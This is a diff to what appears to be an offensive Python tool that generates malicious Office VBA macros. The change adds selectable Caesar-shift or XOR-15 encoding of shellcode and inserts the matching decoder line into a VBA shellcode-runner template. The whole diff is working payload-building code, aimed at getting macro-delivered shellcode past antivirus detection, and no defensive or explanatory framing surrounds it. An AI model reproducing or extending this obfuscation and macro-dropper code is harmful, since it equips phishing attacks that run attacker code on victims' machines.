@@ -131,9 +131,10 @@ def generateMacroPayloadWithPS(lhost, srv_port, arch):
         f.close()
 
 
-def generateMacroPayload(shellcode, arch):
+def generateMacroPayload(technique, shellcode, arch):
 
     print(colored("[+] Generating VBA exploit", 'green'))
+    print(colored(f"    [+] {technique} Encrypting shelcode", 'white'))
 
     # encryption
     #print(shellcode)
@@ -150,26 +151,46 @@ def generateMacroPayload(shellcode, arch):
         counter = counter + 1
 
     shellcode_chars = list(filter(None, shellcode_chars))
-    #print(shellcode_chars)
+    print(shellcode_chars)
 
-    encoded_shellcode_chars = []
+    # cesar encoding
+    cesar_encoded_shellcode_chars = []
     counter = 0
     for b in shellcode_chars:
         counter = counter + 1
         if (counter % 50 == 0):
-            encoded_shellcode_chars.append(" _\n" + str((int(b)+2 & 0xFF)))
+            cesar_encoded_shellcode_chars.append(" _\n" + str((int(b)+2 & 0xFF)))
         else:
-            encoded_shellcode_chars.append(str((int(b)+2 & 0xFF)))
+            cesar_encoded_shellcode_chars.append(str((int(b)+2 & 0xFF)))
 
-    
-    #print(encoded_shellcode_chars)
-    encoded_shellcode = shellcode_start + "("+ ",".join(filter(None,encoded_shellcode_chars)) + ")"
+    # xor encoding
+    xor_encoded_shellcode_chars = []
+    counter = 0
+    for b in shellcode_chars:
+        counter = counter + 1
+        if (counter % 50 == 0):
+            xor_encoded_shellcode_chars.append(" _\n" + str((int(b) ^ 15 & 0xFF)))
+        else:
+            xor_encoded_shellcode_chars.append(str((int(b) ^ 15 & 0xFF)))
+
+    if (technique == "xor"):
+        result = xor_encoded_shellcode_chars
+        shellcode_decoder = "buf(i) = buf(i) Xor 15"
+    elif (technique == "cesar"):
+        result = cesar_encoded_shellcode_chars
+        shellcode_decoder = "buf(i) = buf(i) - 2"
+
+    #print(f"cesar: {encoded_shellcode_chars}")
+    #print(f"xor: {xor_encoded_shellcode_chars}")
+
+    encoded_shellcode = shellcode_start + "("+ ",".join(filter(None,result)) + ")"
     #print(encoded_shellcode)
 
     # VBA shellcode runner
     template_name = "vba.vba"
     template = read_file("templates/" + template_name)
     template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode)
+    template_out = template_out.replace("%DECODER%", shellcode_decoder)
     
     f = open(f"output/{arch}/" + template_name, 'w')
     f.write(template_out)
